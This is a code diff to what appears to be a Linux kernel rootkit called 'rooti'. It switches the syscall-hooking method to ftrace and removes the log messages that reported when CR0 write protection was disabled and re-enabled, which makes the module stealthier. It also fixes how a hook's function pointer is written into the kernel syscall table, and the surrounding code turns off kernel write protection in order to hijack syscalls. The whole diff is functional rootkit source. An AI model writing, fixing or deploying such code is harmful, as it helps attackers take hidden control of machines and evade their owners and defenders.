@@ -9,7 +9,7 @@ is meant to be set euqal one the these options, and it indicates the chosen hook
 #define ROOTI_METHOD_TABLE_HIJACKING 0  // Classic method of overriding the pointer in the syscall table, works on older kernels
 #define ROOTI_METHOD_FTRACE 1           // Intercepting syscalls by registering an ftrace callback to handlers and modifying IP reg
 
-#define ROOTI_HOOKING_METHOD ROOTI_METHOD_TABLE_HIJACKING
+#define ROOTI_HOOKING_METHOD ROOTI_METHOD_FTRACE
 
 unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;
 
@@ -109,14 +109,12 @@ static inline void rooti_force_write_cr0(unsigned long val)
 static inline void rooti_unprotect_memory(void)
 {
     rooti_force_write_cr0(read_cr0() & (~0x10000));
-    printk(KERN_INFO "rooti: disabled write protection\n");
 }
 
 /* Enable the write protection by setting the 16th bit of the CR0 register */
 static inline void rooti_protect_memory(void)
 {
     rooti_force_write_cr0(read_cr0() | (0x10000));
-    printk(KERN_INFO "rooti: enabled write protection\n");
 }
 
 /*
@@ -184,7 +182,7 @@ static int rooti_install_table_hijack_hook(struct rooti_syscall_hook *hook)
     rooti_unprotect_memory();
 
     // Override the syscall table entry
-    __sys_call_table[hook->idx] = (unsigned long)&hook->func;
+    __sys_call_table[hook->idx] = (unsigned long)hook->func;
 
     // Re-enable write protection
     rooti_protect_memory();
@@ -193,7 +191,7 @@ static int rooti_install_table_hijack_hook(struct rooti_syscall_hook *hook)
 }
 
 static void rooti_uninstall_table_hijack_hook(struct rooti_syscall_hook *hook)
-{
+{   
     // Disable write protection
     rooti_unprotect_memory();
 
